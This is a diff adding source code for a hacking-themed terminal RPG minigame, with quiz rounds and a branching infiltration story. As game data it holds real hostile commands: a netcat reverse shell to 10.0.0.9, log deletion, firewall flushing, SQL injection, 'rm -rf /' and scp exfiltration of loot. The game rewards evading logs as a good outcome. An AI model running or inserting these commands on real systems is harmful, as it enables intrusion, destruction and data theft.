@@ -1,0 +1,576 @@
+// ================================================================
+//  game.src  |  phantom module  |  BREACH — hacking RPG minigame
+// ================================================================
+// Each round shows a dossier (context) and a question, plus four
+// candidate commands with short descriptions. Figure out which one
+// actually fits the situation, then type it out — picking the wrong
+// tool or botching the syntax costs a life. Type !quit at any prompt
+// to jack out.
+
+Breach = {}
+Breach.layer    = 0
+Breach.maxLives = 3
+Breach.lives    = Breach.maxLives
+Breach.hits     = 0
+Breach.misses   = 0
+Breach.rounds   = 0
+Breach.aborted  = false
+
+Breach.MakeEnemy = function(name, hp, art, scenarios)
+    e = {}
+    e.name = name
+    e.hp = hp
+    e.maxHp = hp
+    e.art = art
+    e.scenarios = scenarios
+    return e
+end function
+
+Breach.MakeScenario = function(context, question, cmds, descs, correct, why)
+    s = {}
+    s.context = context
+    s.question = question
+    s.cmds = cmds
+    s.descs = descs
+    s.correct = correct
+    s.why = why
+    return s
+end function
+
+// ── Sentry Daemon — recon basics ───────────────────────────────────
+sentryArt = ["     ┌──[ SENTRY DAEMON ]──┐", "     │        ◉ ◉          │", "     │       ▄███▄         │", "     └──────────────────────┘"]
+sentryScenarios = []
+sentryScenarios.push(Breach.MakeScenario("Sentry logs show three connection attempts from 10.0.0.7 in the last minute, no successful login yet.", "How do you check who's currently logged into this box before it notices you?", ["who", "ping 10.0.0.7", "rm -rf /var/log", "chmod 777 shell.bin"], ["lists currently logged-in users", "just checks if the host is alive", "wipes logs — way too loud right now", "changes file permissions, unrelated"], 0, "who shows active sessions without touching anything else — the other options either do nothing useful here or leave obvious tracks."))
+sentryScenarios.push(Breach.MakeScenario("You need the daemon's listening ports before deciding how to get in.", "Which command reveals open ports on this machine?", ["netstat -an", "cat /etc/passwd", "kill -9 1", "whoami"], ["lists active connections and listening ports", "dumps user accounts, not ports", "kills PID 1 — this will crash the machine", "just tells you your own username"], 0, "netstat -an is the one that actually shows ports; the others touch unrelated things or are outright dangerous."))
+sentryScenarios.push(Breach.MakeScenario("A file called cred_dump.txt appeared in /root moments ago — you didn't put it there.", "What do you run first to see what's actually in it before doing anything else?", ["cat /root/cred_dump.txt", "rm /root/cred_dump.txt", "ps -ef", "ping 127.0.0.1"], ["reads the file's contents", "deletes it — you'd lose whatever's inside", "lists processes, not file contents", "does nothing relevant"], 0, "cat reads it. Deleting it first destroys evidence you haven't even looked at yet."))
+sentryScenarios.push(Breach.MakeScenario("The daemon looks idle, but you want a live view of what's running before you touch anything.", "How do you check what's currently running on this box?", ["ps -ef", "ls -la /root", "nmap -p22 target", "cd /var/log"], ["lists running processes", "lists files, not processes", "scans a different host entirely", "just changes directory"], 0, "ps -ef is the process list. The rest either look at the wrong thing or scan someone else's machine."))
+sentryEnemy = Breach.MakeEnemy("Sentry Daemon", 40, sentryArt, sentryScenarios)
+
+// ── Firewall Process — bypass / exfil ──────────────────────────────
+firewallArt = ["     ┌──[ FIREWALL PROCESS ]──┐", "     │       ▓▓▓▓▓▓▓          │", "     │      ▓▓ ▓▓ ▓▓          │", "     └─────────────────────────┘"]
+firewallScenarios = []
+firewallScenarios.push(Breach.MakeScenario("Firewall rules are blocking your outbound connection on every port you try.", "How do you clear the firewall's rule table so traffic can get out?", ["iptables -F", "grep -r passwd /etc", "chmod 777 shell.bin", "netstat -tulpn"], ["flushes all firewall rules", "searches for the word passwd — unrelated", "changes permissions, doesn't touch the firewall", "just lists ports, doesn't change anything"], 0, "iptables -F is the only one that actually touches firewall rules."))
+firewallScenarios.push(Breach.MakeScenario("You've got a payload sitting locally that needs to land on 10.0.0.5 before you can trigger it remotely.", "What gets shell.bin onto that box?", ["scp shell.bin root@10.0.0.5:/tmp", "kill -9 1337", "netstat -tulpn", "cd /var/log"], ["copies the file to the remote machine over ssh", "kills a process, doesn't move any files", "lists ports on this machine", "just changes directory"], 0, "scp is the file transfer. None of the others move a single byte to the target."))
+firewallScenarios.push(Breach.MakeScenario("A stray process with PID 1337 is spiking CPU and slowing down your session.", "How do you shut it down?", ["kill -9 1337", "iptables -F", "ssh root@10.0.0.5 -p22", "grep -r passwd /etc"], ["force-kills that exact process id", "touches firewall rules, not processes", "opens a new connection, doesn't stop anything here", "searches files, unrelated"], 0, "kill -9 with the right PID is the only option that stops a runaway process."))
+firewallScenarios.push(Breach.MakeScenario("You suspect stored credentials are readable somewhere under /etc.", "How do you search for them without guessing file names one by one?", ["grep -r passwd /etc", "scp shell.bin root@10.0.0.5:/tmp", "netstat -tulpn", "chmod 777 shell.bin"], ["recursively searches every file under /etc for the string", "uploads a file, doesn't search anything", "network ports, not file contents", "just changes permissions"], 0, "grep -r is a recursive search; the rest don't look inside any files at all."))
+firewallEnemy = Breach.MakeEnemy("Firewall Process", 60, firewallArt, firewallScenarios)
+
+// ── Antivirus Core — stealth / crypto ──────────────────────────────
+avArt = ["     ┌──[ ANTIVIRUS CORE ]──┐", "     │     ╔═╗ ╔═╗ ╔═╗      │", "     │     ╚═╝ ╚═╝ ╚═╝      │", "     └───────────────────────┘"]
+avScenarios = []
+avScenarios.push(Breach.MakeScenario("You pulled creds.txt off the target and it's base64-encoded garbage.", "How do you turn it back into readable text?", ["base64 -d creds.txt", "openssl enc -aes256 -in log.bin", "tar -czf dump.tar.gz /home", "curl -X POST 10.0.0.9/upload"], ["decodes a base64-encoded file", "encrypts, doesn't decode base64", "just archives a folder", "uploads data, doesn't decode anything"], 0, "base64 -d is the decoder. The rest either encrypt, archive, or upload — none of them decode."))
+avScenarios.push(Breach.MakeScenario("log.bin is AES-encrypted and you finally have the key.", "Which command actually uses it to decrypt the file?", ["openssl enc -aes256 -in log.bin", "base64 -d creds.txt", "find / -perm -4000 -type f", "echo $PATH | cut -d: -f1"], ["runs the AES cipher against the file with your key", "wrong encoding entirely, and wrong file", "hunts for suid binaries, unrelated", "just prints part of an env var"], 0, "openssl handles the AES cipher; the others target a different file or don't touch encryption at all."))
+avScenarios.push(Breach.MakeScenario("You need everything under /home off this box in one clean archive before you move on.", "What bundles it all up?", ["tar -czf dump.tar.gz /home", "curl -X POST 10.0.0.9/upload", "find / -perm -4000 -type f", "base64 -d creds.txt"], ["compresses the whole folder into one archive", "sends data somewhere, doesn't package it first", "looks for suid binaries, not a backup", "decodes one file, not a whole folder"], 0, "tar packages the folder. Uploading before packaging, or grabbing the wrong thing entirely, doesn't get you a clean archive."))
+avScenarios.push(Breach.MakeScenario("This antivirus core likely runs as a service with elevated rights somewhere on disk.", "How do you hunt for binaries that run with owner privileges regardless of who calls them?", ["find / -perm -4000 -type f", "echo $PATH | cut -d: -f1", "tar -czf dump.tar.gz /home", "openssl enc -aes256 -in log.bin"], ["finds every file with the suid bit set", "just shows the first PATH entry", "archives a folder, doesn't search permissions", "encrypts a file, unrelated to permission bits"], 0, "find with -perm -4000 is the suid search. Nothing else here even looks at file permissions."))
+avEnemy = Breach.MakeEnemy("Antivirus Core", 85, avArt, avScenarios)
+
+// ── BLACK ICE — advanced attack chain ──────────────────────────────
+iceArt = ["   ┌────[ ██  BLACK ICE  ██ ]────┐", "   │      ▄▄███████████▄▄        │", "   │     ████ ▀▀▀▀▀▀▀ ████        │", "   │      ▀▀███████████▀▀        │", "   └────────────────────────────┘"]
+iceScenarios = []
+iceScenarios.push(Breach.MakeScenario("A login form on this box is naive enough to concatenate raw input straight into its query.", "What do you feed it to dump every row regardless of credentials?", ["SELECT * FROM users WHERE 1=1", "rm -rf /var/log/auth.log", "decrypt --key AES256 vault.db", "overflow 0x7FFEFFF val=0x41414141"], ["a classic always-true injection that returns every row", "deletes a log file, not a query", "wrong target file entirely", "a memory overflow, not a SQL injection"], 0, "1=1 is the always-true SQL injection. The rest touch a log, a vault, or memory — none of them talk to the database."))
+iceScenarios.push(Breach.MakeScenario("Your last connection attempt just got logged to auth.log — ICE will review it soon.", "How do you make sure this attempt never shows up in that review?", ["rm -rf /var/log/auth.log", "SELECT * FROM users WHERE 1=1", "0xDEADBEEF48656C6C6F", "exec /bin/sh -c 'nc -e /bin/sh 10.0.0.9 4444'"], ["wipes the log file recording your access", "a database query, does nothing to a log file", "a raw hex string, not a command", "opens a shell out, doesn't touch logs"], 0, "rm on the log file is what actually erases the trace. The others don't touch auth.log at all."))
+iceScenarios.push(Breach.MakeScenario("You're in, but you need a persistent way back onto this box without re-running the whole exploit chain.", "What gives you a shell that calls back to your own listener?", ["exec /bin/sh -c 'nc -e /bin/sh 10.0.0.9 4444'", "decrypt --key AES256 vault.db", "rm -rf /var/log/auth.log", "0xDEADBEEF48656C6C6F"], ["spawns a shell that connects back to your listener", "decrypts a file, doesn't open a connection", "clears logs, doesn't establish access", "just a raw hex string"], 0, "the nc reverse shell is the only option that actually opens a connection back to you."))
+iceScenarios.push(Breach.MakeScenario("vault.db is sitting right there, AES-locked, and you finally cracked the key.", "What actually opens it up?", ["decrypt --key AES256 vault.db", "exec /bin/sh -c 'nc -e /bin/sh 10.0.0.9 4444'", "SELECT * FROM users WHERE 1=1", "overflow 0x7FFEFFF val=0x41414141"], ["applies the cracked key to the encrypted vault", "opens a shell, doesn't touch the vault", "a SQL injection, wrong target", "a raw memory overflow, unrelated to a locked file"], 0, "decrypt with the cracked key is the one command that actually targets vault.db."))
+iceEnemy = Breach.MakeEnemy("BLACK ICE", 140, iceArt, iceScenarios)
+
+Breach.enemies = [sentryEnemy, firewallEnemy, avEnemy, iceEnemy]
+
+Breach.Divider = function()
+    print(c.grey + "────────────────────────────────────────────────────────────" + c.ennd)
+end function
+
+Breach.DrawHp = function(label, hp, maxHp, col)
+    barLen = 20
+    filled = floor((hp / maxHp) * barLen)
+    if filled < 0 then filled = 0
+    bar = ""
+    for i in range(1, barLen)
+        if i <= filled then
+            bar = bar + "█"
+        else
+            bar = bar + "░"
+        end if
+    end for
+    print(col + label + " [" + bar + "] " + hp + "/" + maxHp + c.ennd)
+end function
+
+Breach.DrawLives = function()
+    hearts = ""
+    for i in range(1, Breach.maxLives)
+        if i <= Breach.lives then
+            hearts = hearts + "♥ "
+        else
+            hearts = hearts + "♡ "
+        end if
+    end for
+    print(c.cyan + "LIVES [" + hearts + "]" + c.ennd)
+end function
+
+// Fabricates a couple of lines that resemble what the typed command
+// would actually print in a real terminal, keyed off its leading verb.
+// Purely cosmetic — doesn't affect hit/branch resolution at all.
+Breach.FakeOutput = function(typed)
+    if typed == "" then
+        print(c.grey + "  (nothing happens.)" + c.ennd)
+        return
+    end if
+    parts = typed.split(" ")
+    if parts.len == 0 then return
+    verb = parts[0]
+    target = "target"
+    if parts.len >= 2 then target = parts[1]
+    if verb == "who" then
+        print(c.grey + "  root     tty1     2026-07-14 08:14" + c.ennd)
+    else if verb == "ping" then
+        print(c.grey + "  64 bytes from " + target + ": icmp_seq=1 ttl=57 time=11ms" + c.ennd)
+    else if verb == "ls" then
+        print(c.grey + "  bin  etc  home  root  var" + c.ennd)
+    else if verb == "cat" then
+        print(c.grey + "  ...binary/garbled content..." + c.ennd)
+    else if verb == "ps" then
+        print(c.grey + "  PID   USER   CMD" + c.ennd)
+        print(c.grey + "  842   root   watchdogd" + c.ennd)
+    else if verb == "nmap" then
+        print(c.grey + "  22/tcp   open   ssh" + c.ennd)
+    else if verb == "whoami" then
+        print(c.grey + "  guest" + c.ennd)
+    else if verb == "netstat" then
+        print(c.grey + "  tcp   0.0.0.0:22    LISTEN" + c.ennd)
+    else if verb == "scp" then
+        print(c.grey + "  transferring... 100% done" + c.ennd)
+    else if verb == "ssh" then
+        print(c.grey + "  Connected to " + target + c.ennd)
+    else if verb == "grep" then
+        print(c.grey + "  match: user:5f4dcc3b5aa765d61d8327deb882cf99" + c.ennd)
+    else if verb == "base64" then
+        print(c.grey + "  decoded: admin:hunter2" + c.ennd)
+    else if verb == "openssl" then
+        print(c.grey + "  decrypting... done" + c.ennd)
+    else if verb == "tar" then
+        print(c.grey + "  archive written." + c.ennd)
+    else if verb == "curl" then
+        print(c.grey + "  HTTP/1.1 200 OK" + c.ennd)
+    else if verb == "echo" then
+        if parts.len > 1 then print(c.grey + "  " + parts[1:].join(" ") + c.ennd)
+    else if verb == "find" then
+        print(c.grey + "  searching..." + c.ennd)
+        print(c.grey + "  1 result found." + c.ennd)
+    else if verb == "SELECT" then
+        print(c.grey + "  1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99" + c.ennd)
+        print(c.grey + "  2 | root  | e10adc3949ba59abbe56e057f20f883e" + c.ennd)
+    else if verb == "decrypt" then
+        print(c.grey + "  decrypting... unlocked." + c.ennd)
+    else if verb == "exec" then
+        print(c.grey + "  shell spawned, connection established." + c.ennd)
+    else if verb == "overflow" then
+        print(c.grey + "  segfault — process crashed, core dumped." + c.ennd)
+    else if verb == "ifconfig" then
+        if target == "up" then
+            print(c.grey + "  eth0: flags=4163<UP,BROADCAST,RUNNING>" + c.ennd)
+        else
+            print(c.grey + "  eth0: flags=4098<BROADCAST> (link down)" + c.ennd)
+        end if
+    else if verb == "harvest" then
+        print(c.grey + "  found 1 stored credential." + c.ennd)
+    else if verb == "proxy" then
+        print(c.grey + "  routing traffic through " + target + c.ennd)
+    else if verb == "sudo" then
+        print(c.grey + "  [sudo] password accepted." + c.ennd)
+    else if verb == "cover" then
+        print(c.grey + "  log entries corrupted." + c.ennd)
+    else if verb == "passwd" then
+        print(c.grey + "  password updated." + c.ennd)
+    else if verb == "write" then
+        print(c.grey + "  wrote to file." + c.ennd)
+    else
+        print(c.grey + "  " + verb + ": done." + c.ennd)
+    end if
+end function
+
+Breach.PresentScenario = function(scenario)
+    print(char(10))
+    print(c.teal + "DOSSIER > " + c.white + scenario.context + c.ennd)
+    print(c.gold + "<b>" + scenario.question + c.ennd)
+    for i in range(0, scenario.cmds.len - 1)
+        print(c.grey + "  • " + c.white + scenario.cmds[i] + c.grey + "  — " + scenario.descs[i] + c.ennd)
+    end for
+end function
+
+Breach.ResolveTurn = function(enemy)
+    scenario = enemy.scenarios[floor(rnd * enemy.scenarios.len)]
+    Breach.PresentScenario(scenario)
+    startT = time
+    typed = user_input(c.grey + "type the full command exactly as shown above > " + c.ennd, false, false)
+    elapsed = time - startT
+    if typed == "!quit" then
+        Breach.aborted = true
+        return
+    end if
+    Breach.FakeOutput(typed)
+
+    correctCmd = scenario.cmds[scenario.correct]
+    Breach.rounds = Breach.rounds + 1
+
+    if typed == correctCmd then
+        Breach.hits = Breach.hits + 1
+        baseDmg = 12 + floor(Breach.layer * 4)
+        dmg = baseDmg
+        speedBonus = false
+        if elapsed <= (correctCmd.len * 0.3) then
+            dmg = dmg + 6
+            speedBonus = true
+        end if
+        tag = c.lime + "<b>[HIT] typed exactly right"
+        if speedBonus then tag = tag + ", fast exec!"
+        print(tag + " -" + dmg + " to " + enemy.name + c.ennd)
+        enemy.hp = enemy.hp - dmg
+        if enemy.hp < 0 then enemy.hp = 0
+        return
+    end if
+
+    matchedWrong = false
+    for cmdOpt in scenario.cmds
+        if typed == cmdOpt then matchedWrong = true
+    end for
+
+    Breach.misses = Breach.misses + 1
+    Breach.lives = Breach.lives - 1
+    if matchedWrong then
+        print(c.red + "<b>[WRONG CALL] that's not what handles this." + c.ennd)
+        print(c.grey + "  " + scenario.why + c.ennd)
+    else
+        print(c.yellow + "<b>[REJECTED] not typed exactly — command not recognized." + c.ennd)
+        print(c.grey + "  correct command was: " + c.white + correctCmd + c.ennd)
+    end if
+    print(c.red + "  you lose a life! (" + Breach.lives + " left)" + c.ennd)
+end function
+
+Breach.Fight = function(enemy)
+    print(char(10))
+    for line in enemy.art
+        print(c.purple + line + c.ennd)
+    end for
+    print(c.white + "<b>" + enemy.name + " blocks the path." + c.ennd)
+    Breach.lives = Breach.maxLives
+    while enemy.hp > 0 and Breach.lives > 0 and not Breach.aborted
+        print(char(10))
+        Breach.DrawLives()
+        Breach.DrawHp(enemy.name[:5], enemy.hp, enemy.maxHp, c.orange)
+        Breach.ResolveTurn(enemy)
+    end while
+    if Breach.aborted then return false
+    if Breach.lives <= 0 then return false
+    print(c.lime + "<b>" + enemy.name + " process terminated." + c.ennd)
+    return true
+end function
+
+Breach.Banner = function()
+    clear_screen
+    print(char(10))
+    print(c.red + "<b>  ██████╗ ██████╗ ███████╗ █████╗  ██████╗██╗  ██╗" + c.ennd)
+    print(c.red + "<b>  ██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║" + c.ennd)
+    print(c.orange + "<b>  ██████╔╝██████╔╝█████╗  ███████║██║     ███████║" + c.ennd)
+    print(c.orange + "<b>  ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██║     ██╔══██║" + c.ennd)
+    print(c.gold + "<b>  ██████╔╝██║  ██║███████╗██║  ██║╚██████╗██║  ██║" + c.ennd)
+    print(c.gold + "<b>  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝" + c.ennd)
+    print(c.grey + "     read the dossier, pick the right tool, type it clean" + c.ennd)
+    print(char(10))
+end function
+
+Breach.RunBreach = function()
+    Breach.hits     = 0
+    Breach.misses   = 0
+    Breach.rounds   = 0
+    Breach.aborted  = false
+    for enemy in Breach.enemies
+        enemy.hp = enemy.maxHp
+    end for
+
+    Breach.Banner()
+    print(c.grey + "You've slipped past the gateway. Something is already routing to intercept you." + c.ennd)
+    user_input(c.grey + "press enter to jack in..." + c.ennd, false, false)
+
+    Breach.layer = 0
+    won = true
+    for enemy in Breach.enemies
+        Breach.layer = Breach.layer + 1
+        won = Breach.Fight(enemy)
+        if not won then break
+    end for
+
+    print(char(10))
+    Breach.Divider()
+    if Breach.aborted then
+        print(c.yellow + "<b>Jacked out early. Connection closed clean." + c.ennd)
+    else if not won then
+        print(c.red + "<b>CONNECTION TERMINATED — out of lives." + c.ennd)
+        print(c.grey + "  made it to layer " + Breach.layer + " of " + Breach.enemies.len + "." + c.ennd)
+    else
+        print(c.lime + "<b>BREACH COMPLETE — you're out, clean, with everything you came for." + c.ennd)
+    end if
+    if Breach.rounds > 0 then
+        hitRate = floor((Breach.hits / Breach.rounds) * 100)
+        print(c.grey + "  rounds: " + Breach.rounds + "   hits: " + Breach.hits + "   fails: " + Breach.misses + "   hit rate: " + hitRate + "%" + c.ennd)
+    end if
+    Breach.Divider()
+end function
+
+// ================================================================
+//  story mode — a small branching infiltration. No options shown;
+//  you have to know (or guess) the right command from context.
+//  Structured as a node graph so it's easy to bolt on more forks
+//  and endings later without touching the runner itself.
+// ================================================================
+Breach.MakeBranch = function(cmd, next, output = null)
+    b = {}
+    b.cmd = cmd
+    b.next = next
+    b.output = output
+    return b
+end function
+
+Breach.MakeNode = function(id, text, hints, branches, fallback)
+    n = {}
+    n.id = id
+    n.text = text
+    n.hints = hints
+    n.branches = branches
+    n.fallback = fallback
+    return n
+end function
+
+Breach.MakeEnding = function(id, tag, title, text)
+    e = {}
+    e.id = id
+    e.tag = tag
+    e.title = title
+    e.text = text
+    return e
+end function
+
+Breach.storyNodes = {}
+Breach.storyEndings = {}
+
+startBranches = [Breach.MakeBranch("rm -rf /var/log/auth.log", "vault", ["removing '/var/log/auth.log'", "log cleared."]), Breach.MakeBranch("kill -9 1337", "chase", ["kill: sent SIGKILL to 1337", "process terminated."])]
+startHints = ["rm -rf /var/log/auth.log", "kill -9 1337"]
+Breach.storyNodes["start"] = Breach.MakeNode("start", "You're through the outer gateway. A watchdog daemon logs every connection attempt in real time — if it finishes writing this one, the whole segment locks down. You've got maybe two moves before it syncs.", startHints, startBranches, "end_caught")
+
+vaultBranches = [Breach.MakeBranch("find -name vaultkey", "end_clean", ["searching...", "found: /home/admin/vaultkey"]), Breach.MakeBranch("decrypt -f vault.db", "end_partial", ["forcing decryption...", "vault.db: unlocked (unstable)"]), Breach.MakeBranch("cp vault.db /tmp/backup.db", "backup_escape", ["'vault.db' -> '/tmp/backup.db'", "1 file copied."]), Breach.MakeBranch("overflow 0x7FFEFFF val=0x41414141", "overflow_node", ["injecting payload at 0x7FFEFFF...", "segmentation fault (core dumped)"])]
+vaultHints = ["find -name vaultkey", "decrypt -f vault.db", "cp vault.db /tmp/backup.db", "overflow 0x7FFEFFF val=0x41414141"]
+Breach.storyNodes["vault"] = Breach.MakeNode("vault", "Clean getaway so far. Ahead sits a vault process holding what you actually came for, but it's encrypted and you don't have a key yet.", vaultHints, vaultBranches, "end_locked")
+
+overflowBranches = [Breach.MakeBranch("cat core.dump", "end_rawdump", ["...garbled binary sprawl across the screen...", "(binary data, 4.2MB)"]), Breach.MakeBranch("grep -r key core.dump", "end_keyfound", ["Binary file core.dump matches", "key: 9f2a...c41e"]), Breach.MakeBranch("rm core.dump", "end_nodump", ["removed 'core.dump'"]), Breach.MakeBranch("ps -ef", "postcrash_node", ["PID   USER   CMD", "3390  root   watchdog-respond"])]
+overflowHints = ["cat core.dump", "grep -r key core.dump", "rm core.dump", "ps -ef"]
+Breach.storyNodes["overflow_node"] = Breach.MakeNode("overflow_node", "The overflow worked — the vault process crashed and dumped its memory to a core file before it died. Whatever was inside is scattered in there somewhere, but a crash like that doesn't go unnoticed for long.", overflowHints, overflowBranches, "end_restarted")
+
+postcrashBranches = [Breach.MakeBranch("sleep 5", "end_stillwatching", ["...", "5 seconds elapsed."]), Breach.MakeBranch("kill -9 2048", "end_cleansweep", ["kill: sent SIGKILL to 2048", "process terminated."]), Breach.MakeBranch("ls /root", "end_distracted", ["notes.txt  id_rsa  .bash_history"])]
+postcrashHints = ["sleep 5", "kill -9 2048", "ls /root"]
+Breach.storyNodes["postcrash_node"] = Breach.MakeNode("postcrash_node", "You check what's stirring after the crash. Something already spawned to investigate — you've got a small window before it finishes booting.", postcrashHints, postcrashBranches, "end_noticed")
+
+chaseBranches = [Breach.MakeBranch("scp loot.tar.gz me@10.0.0.9:/tmp", "end_grab", ["'loot.tar.gz' -> 'me@10.0.0.9:/tmp'", "transferring... 100% done"]), Breach.MakeBranch("kill -9 4471", "end_silenced", ["kill: sent SIGKILL to 4471", "process terminated."]), Breach.MakeBranch("ifconfig -down", "ghost_aftermath", ["eth0: flags=4098<BROADCAST> (link down)"])]
+chaseHints = ["scp loot.tar.gz me@10.0.0.9:/tmp", "kill -9 4471", "ifconfig -down"]
+Breach.storyNodes["chase"] = Breach.MakeNode("chase", "The watchdog's death scream already reached a response team — you can hear its process spawning children on this segment. You've got seconds before they lock the whole thing down.", chaseHints, chaseBranches, "end_alarm")
+
+backupBranches = [Breach.MakeBranch("scp backup.db me@10.0.0.9:/tmp", "end_exfil", ["'backup.db' -> 'me@10.0.0.9:/tmp'", "transferring... 100% done"]), Breach.MakeBranch("chmod 000 /tmp/backup.db", "end_stashed", ["mode of '/tmp/backup.db' changed to 0000"]), Breach.MakeBranch("rm /tmp/backup.db", "end_purged", ["removed '/tmp/backup.db'"])]
+backupHints = ["scp backup.db me@10.0.0.9:/tmp", "chmod 000 /tmp/backup.db", "rm /tmp/backup.db"]
+Breach.storyNodes["backup_escape"] = Breach.MakeNode("backup_escape", "The vault backup is sitting in /tmp, but you're not out yet — the segment's watching outbound traffic closer since the daemon went down.", backupHints, backupBranches, "end_flagged")
+
+ghostBranches = [Breach.MakeBranch("ifconfig up", "reroute_node", ["eth0: flags=4163<UP,BROADCAST,RUNNING>"]), Breach.MakeBranch("ping 10.0.0.1", "probe_node", ["64 bytes from 10.0.0.1: icmp_seq=1 ttl=61 time=4ms"]), Breach.MakeBranch("sleep 60", "end_wait", ["...", "60 seconds elapsed."])]
+ghostHints = ["ifconfig up", "ping 10.0.0.1", "sleep 60"]
+Breach.storyNodes["ghost_aftermath"] = Breach.MakeNode("ghost_aftermath", "Your uplink's dead and so is your trail — but you're still physically sitting on this segment's hardware with no way out the way you came in.", ghostHints, ghostBranches, "end_stranded")
+
+rerouteBranches = [Breach.MakeBranch("scp phantom me@10.0.0.9:/tmp", "end_selfclean", ["'phantom' -> 'me@10.0.0.9:/tmp'", "transferring... 100% done"]), Breach.MakeBranch("netstat -an", "end_watched", ["tcp   0.0.0.0:22    LISTEN", "tcp   10.0.0.5:445  ESTABLISHED"]), Breach.MakeBranch("ssh me@10.0.0.9 -p22", "end_relog", ["Connected to me@10.0.0.9", "Last login: Tue Jul 14 08:11:02"])]
+rerouteHints = ["scp phantom me@10.0.0.9:/tmp", "netstat -an", "ssh me@10.0.0.9 -p22"]
+Breach.storyNodes["reroute_node"] = Breach.MakeNode("reroute_node", "Fresh interface, fresh route — but you're still sitting on hardware that remembers you until you're actually gone. One more move to make this stick.", rerouteHints, rerouteBranches, "end_correlated")
+
+probeBranches = [Breach.MakeBranch("harvest", "harvest_node", ["scanning /home/*/Config for stored logins...", "1 credential recovered."]), Breach.MakeBranch("nmap -p22", "sidedoor_node", ["22/tcp   open   ssh"]), Breach.MakeBranch("proxy 10.0.0.9", "end_proxied", ["routing traffic through 10.0.0.9", "proxy established."]), Breach.MakeBranch("ar", "autoroot_node")]
+probeHints = ["harvest", "nmap -p22", "proxy 10.0.0.9", "ar"]
+Breach.storyNodes["probe_node"] = Breach.MakeNode("probe_node", "The gateway two hops over is live, but you don't have working creds for anything on this subnet yet.", probeHints, probeBranches, "end_deadend")
+
+autorootBranches = [Breach.MakeBranch("useradd ghost", "end_backdoor", ["user 'ghost' added.", "uid=1004(ghost) gid=1004(ghost)"]), Breach.MakeBranch("corlog", "scrubbed_node", ["corrupting login record...", "auth.log entry overwritten."]), Breach.MakeBranch("passwd root", "end_lockedout", ["Enter new password: ********", "passwd: password updated successfully"]), Breach.MakeBranch("rm -rf /", "end_nuked", ["removing '/'...", "removing '/bin'...", "removing '/etc'..."])]
+autorootHints = ["useradd ghost", "corlog", "passwd root", "rm -rf /"]
+Breach.storyNodes["autoroot_node"] = Breach.MakeNode("autoroot_node", "ar cracked it in seconds flat — you've got root on this box, no lingering behind a borrowed identity or a half-open port. That kind of speed isn't quiet, though.", autorootHints, autorootBranches, "end_overstayed")
+
+scrubbedBranches = [Breach.MakeBranch("userdel ghost", "end_thorough", ["removing user 'ghost'...", "user deleted."]), Breach.MakeBranch("harvest", "harvest2_node", ["scanning /home/*/Config for stored logins...", "3 credentials recovered."]), Breach.MakeBranch("kill -9 1", "end_crashed", ["kill: sent SIGKILL to 1", "system halted."])]
+scrubbedHints = ["userdel ghost", "harvest", "kill -9 1"]
+Breach.storyNodes["scrubbed_node"] = Breach.MakeNode("scrubbed_node", "The log's wiped clean of the login, but you're still sitting on root of a box that isn't yours. Time to decide how you leave it.", scrubbedHints, scrubbedBranches, "end_dawdled")
+
+harvest2Branches = [Breach.MakeBranch("write creds.txt", "end_stocked", ["wrote 3 lines to 'creds.txt'"]), Breach.MakeBranch("sleep 30", "end_greedy", ["...", "30 seconds elapsed."]), Breach.MakeBranch("rm creds.txt", "end_wasted", ["removed 'creds.txt'"])]
+harvest2Hints = ["write creds.txt", "sleep 30", "rm creds.txt"]
+Breach.storyNodes["harvest2_node"] = Breach.MakeNode("harvest2_node", "Root gets you read access to every stored credential on this box. Tempting to grab a few before you go — but every second you spend digging is a second you're not actually leaving.", harvest2Hints, harvest2Branches, "end_greedcaught")
+
+harvestBranches = [Breach.MakeBranch("whoami", "end_lowkey", ["dgibson"]), Breach.MakeBranch("sudo su root", "end_overreach", ["[sudo] password for dgibson: ********", "dgibson is now root."]), Breach.MakeBranch("cover", "end_covered", ["scrubbing login trace from auth.log...", "done."])]
+harvestHints = ["whoami", "sudo su root", "cover"]
+Breach.storyNodes["harvest_node"] = Breach.MakeNode("harvest_node", "You're in under someone else's login. It'll hold as long as you don't do anything that name wouldn't normally do.", harvestHints, harvestBranches, "end_burned")
+
+sidedoorBranches = [Breach.MakeBranch("ps -ef", "end_spotted", ["PID   USER   CMD", "118   root   portmonitord"]), Breach.MakeBranch("rm -rf /var/log", "end_scorched", ["removing '/var/log'...", "directory cleared."]), Breach.MakeBranch("chmod 000 /var/log/syslog", "end_quietlock", ["mode of '/var/log/syslog' changed to 0000"])]
+sidedoorHints = ["ps -ef", "rm -rf /var/log", "chmod 000 /var/log/syslog"]
+Breach.storyNodes["sidedoor_node"] = Breach.MakeNode("sidedoor_node", "You're through the side door, but it's an ugly, half-open service nobody bothered securing properly — which probably means it's being watched by something else too.", sidedoorHints, sidedoorBranches, "end_caughtinside")
+
+Breach.storyEndings["end_clean"] = Breach.MakeEnding("end_clean", "good", "TEXTBOOK RUN", "You found the key sitting in plain sight, unlocked the vault, and walked out without tripping a single alarm. Nobody even knows you were here.")
+Breach.storyEndings["end_partial"] = Breach.MakeEnding("end_partial", "partial", "SMASH AND GRAB", "You forced the vault open without the key. You got what you came for, but the brute-force attempt left a fingerprint — they'll know someone was in here.")
+Breach.storyEndings["end_locked"] = Breach.MakeEnding("end_locked", "bad", "LOCKED OUT", "Nothing you tried opened the vault. You slip back out the way you came, empty-handed but unnoticed.")
+Breach.storyEndings["end_alarm"] = Breach.MakeEnding("end_alarm", "risky", "LOUD EXIT", "You hesitated a beat too long. The response team locked the segment down around you, but you were already gone.")
+Breach.storyEndings["end_grab"] = Breach.MakeEnding("end_grab", "partial", "GRAB AND RUN", "You yanked what you came for and got out half a second before the segment sealed. Loud, messy, but you're not leaving empty-handed.")
+Breach.storyEndings["end_silenced"] = Breach.MakeEnding("end_silenced", "risky", "DOUBLE TAP", "You killed the responder before it finished spinning up. You're still burned — two dead processes in one session doesn't go unnoticed — but nothing followed you out.")
+Breach.storyEndings["end_exfil"] = Breach.MakeEnding("end_exfil", "good", "CLEAN GETAWAY", "The transfer clears before anyone flags it. You're out, backup in hand, without a mark on the log.")
+Breach.storyEndings["end_stashed"] = Breach.MakeEnding("end_stashed", "partial", "BURIED", "You lock the file down and leave it hidden in /tmp instead of risking the transfer now. Safe, but you walk away without it this trip.")
